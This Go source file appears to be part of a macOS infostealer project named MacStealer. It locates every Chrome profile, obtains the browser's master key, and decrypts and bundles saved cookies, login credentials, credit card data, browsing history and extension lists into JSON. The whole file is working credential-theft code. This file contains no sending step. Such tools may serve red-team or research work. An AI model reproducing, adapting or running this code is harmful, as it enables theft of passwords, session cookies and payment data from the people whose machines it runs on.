//go:build darwin

package main

import (
    "encoding/base64"
    "encoding/json"
    "fmt"
    "os"
    "os/user"
    "path/filepath"
    "strings"

    "github.com/ultra-supara/MacStealer/browsingdata"
    "github.com/ultra-supara/MacStealer/masterkey"
)

type DarwinBrowserDataExtractor struct{}

func getDarwinChromeBasePath() string {
    usr, err := user.Current()
    if err != nil {
        return ""
    }
    return filepath.Join(usr.HomeDir, "Library/Application Support/Google/Chrome")
}

func getDarwinDefaultPath(kind, profile string) string {
    base := filepath.Join(getDarwinChromeBasePath(), profile)
    switch kind {
    case "cookie":
        return filepath.Join(base, "Cookies")
    case "logindata":
        return filepath.Join(base, "Login Data")
    case "creditcard":
        return filepath.Join(base, "Web Data")
    case "history":
        return filepath.Join(base, "History")
    case "extension":
        return filepath.Join(base, "Preferences")
    default:
        return ""
    }
}

func getDarwinMasterKeyBase64() string {
    key, err := masterkey.GetMasterKey("")
    if err != nil {
        return ""
    }
    return base64.StdEncoding.EncodeToString(key)
}

func listDarwinProfiles() []string {
    base := getDarwinChromeBasePath()
    entries, err := os.ReadDir(base)
    if err != nil {
        return []string{"Default"}
    }
    var profiles []string
    for _, e := range entries {
        if !e.IsDir() {
            continue
        }
        n := e.Name()
        if n == "Default" || strings.HasPrefix(n, "Profile ") {
            prefPath := filepath.Join(base, n, "Preferences")
            if _, err := os.Stat(prefPath); err == nil {
                profiles = append(profiles, n)
            }
        }
    }
    if len(profiles) == 0 {
        return []string{"Default"}
    }
    return profiles
}

func (e *DarwinBrowserDataExtractor) ExtractCookies(path string) ([]byte, error) {
    mk := getDarwinMasterKeyBase64()
    if path != "" {
        cookies, err := browsingdata.GetCookie(mk, path)
        if err != nil {
            return nil, fmt.Errorf("failed to extract cookies: %w", err)
        }
        return json.Marshal(cookies)
    }
    var all []browsingdata.Cookie
    for _, p := range listDarwinProfiles() {
        cp := getDarwinDefaultPath("cookie", p)
        if _, err := os.Stat(cp); err != nil {
            continue
        }
        cookies, err := browsingdata.GetCookie(mk, cp)
        if err != nil {
            continue
        }
        all = append(all, cookies...)
    }
    return json.Marshal(all)
}

func (e *DarwinBrowserDataExtractor) ExtractLoginData(path string) ([]byte, error) {
    mk := getDarwinMasterKeyBase64()
    if path != "" {
        ld, err := browsingdata.GetLoginData(mk, path)
        if err != nil {
            return nil, fmt.Errorf("failed to extract login data: %w", err)
        }
        return json.Marshal(ld)
    }
    var all []interface{}
    for _, p := range listDarwinProfiles() {
        lp := getDarwinDefaultPath("logindata", p)
        if _, err := os.Stat(lp); err != nil {
            continue
        }
        ld, err := browsingdata.GetLoginData(mk, lp)
        if err != nil {
            continue
        }
        for _, v := range ld {
            all = append(all, v)
        }
    }
    return json.Marshal(all)
}

func (e *DarwinBrowserDataExtractor) ExtractCreditCards(path string) ([]byte, error) {
    mk := getDarwinMasterKeyBase64()
    if path != "" {
        cc, err := browsingdata.GetCreditCard(mk, path)
        if err != nil {
            return nil, fmt.Errorf("failed to extract credit cards: %w", err)
        }
        return json.Marshal(cc)
    }
    var all []browsingdata.CreditCard
    for _, p := range listDarwinProfiles() {
        cp := getDarwinDefaultPath("creditcard", p)
        if _, err := os.Stat(cp); err != nil {
            continue
        }
        cc, err := browsingdata.GetCreditCard(mk, cp)
        if err != nil {
            continue
        }
        all = append(all, cc...)
    }
    return json.Marshal(all)
}

func (e *DarwinBrowserDataExtractor) ExtractHistory(path string) ([]byte, error) {
    if path != "" {
        h, err := browsingdata.GetHistory(path)
        if err != nil {
            return nil, fmt.Errorf("failed to extract history: %w", err)
        }
        return json.Marshal(h)
    }
    var all []browsingdata.History
    for _, p := range listDarwinProfiles() {
        hp := getDarwinDefaultPath("history", p)
        if _, err := os.Stat(hp); err != nil {
            continue
        }
        h, err := browsingdata.GetHistory(hp)
        if err != nil {
            continue
        }
        all = append(all, h...)
    }
    return json.Marshal(all)
}

func (e *DarwinBrowserDataExtractor) ExtractExtensions(path string) ([]byte, error) {
    if path != "" {
        ext, err := browsingdata.GetExtension(path)
        if err != nil {
            return nil, fmt.Errorf("failed to extract extensions: %w", err)
        }
        return json.Marshal(ext)
    }
    var all []browsingdata.Extension
    for _, p := range listDarwinProfiles() {
        ep := getDarwinDefaultPath("extension", p)
        if _, err := os.Stat(ep); err != nil {
            continue
        }
        ext, err := browsingdata.GetExtension(ep)
        if err != nil {
            continue
        }
        all = append(all, ext...)
    }
    return json.Marshal(all)
}
